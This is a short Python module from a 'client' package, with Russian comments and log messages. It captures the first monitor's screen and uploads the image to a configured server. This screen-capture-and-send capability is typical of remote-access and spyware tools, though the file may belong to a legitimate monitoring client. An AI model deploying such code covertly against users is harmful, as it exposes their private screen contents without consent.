import requests
from mss import mss
from mss.tools import to_png
from client.config import SERVER_URL
from client.logger_config import setup_logger

logger = setup_logger()

def take_screenshot():
    try:
        with mss() as sct:
            # Используем первый монитор; если нужно, можно динамически определять монитор
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            screenshot_data = to_png(screenshot.rgb, screenshot.size)
    except Exception as e:
        logger.error("Ошибка захвата скриншота: " + str(e))
        return

    try:
        logger.info("Отправка скриншота на сервер...")
        response = requests.post(
            f"{SERVER_URL}/screenshot",
            data=screenshot_data,
            headers={"Content-Type": "image/png"},
            timeout=10
        )
        if response.ok:
            logger.info("Скриншот успешно отправлен.")
        else:
            logger.error(f"Ошибка отправки скриншота: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error("Ошибка отправки скриншота: " + str(e))
